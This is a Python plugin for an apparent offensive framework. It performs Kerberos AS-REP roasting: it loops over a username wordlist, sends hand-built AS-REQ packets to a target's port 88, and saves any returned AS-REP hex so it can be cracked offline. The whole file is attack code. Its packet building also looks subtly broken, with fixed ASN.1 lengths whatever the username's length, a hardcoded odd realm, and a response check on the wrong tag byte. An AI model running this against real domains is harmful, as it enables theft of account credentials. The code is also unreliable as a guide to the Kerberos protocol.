PORTS = [88]
def run(host, results, **kwargs):
    """
    Bōryoku Framework
    Author: Dion Mulaj
    Kerberos AS-REP Roasting Plugin
    - Attempts to request AS-REP for usernames
    - If a user does not require pre-auth, the AS-REP is returned and can be cracked offline
    """
    import socket
    import struct
    import time
    import os

    kerberos_port = 88
    timeout = 3
    wordlist_path = os.path.join(os.path.dirname(__file__), '../wordlists/usernames.txt')
    if os.path.exists(wordlist_path):
        with open(wordlist_path) as f:
            usernames = [line.strip() for line in f if line.strip()]
    else:
        usernames = []

    info_lines = []
    for username in usernames:
        try:
            req = bytes.fromhex(
                "6a 81 9a 30 81 97 a0 03 02 01 05 a1 03 02 01 0a a2 07 03 05 00 10 00 00 00 a3 1b 30 19 a0 03 02 01 01 a1 12 30 10 1b 0e"
            ) + username.encode() + bytes.fromhex(
                "a2 81 81 30 81 7e a0 03 02 01 02 a1 03 02 01 01 a2 73 04 71 30 6f a0 03 02 01 01 a1 68 30 66 a0 1b 30 19 a0 03 02 01 01 a1 12 30 10 1b 0e 6b 65 72 62 65 72 6f 73 2e 6c 6f 63 61 6c a2 49 04 47 30 45 a0 03 02 01 17 a1 3e 30 3c 1b 0c 53 45 52 56 45 52 2d 4e 41 4d 45 1b 2c 45 58 41 4d 50 4c 45 2e 43 4f 4d 2e 4c 4f 43 41 4c 2e 44 4f 4d 41 49 4e 2e 43 4f 4d 2e 4c 4f 43 41 4c"
            )
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            sock.sendto(req, (host, kerberos_port))
            data, addr = sock.recvfrom(4096)
            if data and data[0] == 0x7b:  
                info_lines.append(f"AS-REP received for user '{username}' on {host} (no pre-auth required!)")
                info_lines.append(data.hex())
            sock.close()
        except Exception:
            pass  
    if not info_lines:
        info_lines.append("AS-REP - No results found.")
    if host not in results:
        results[host] = {}
    results[host].setdefault("PLUGIN-KERBEROS-AS-REP-ROASTING", []).extend(info_lines)
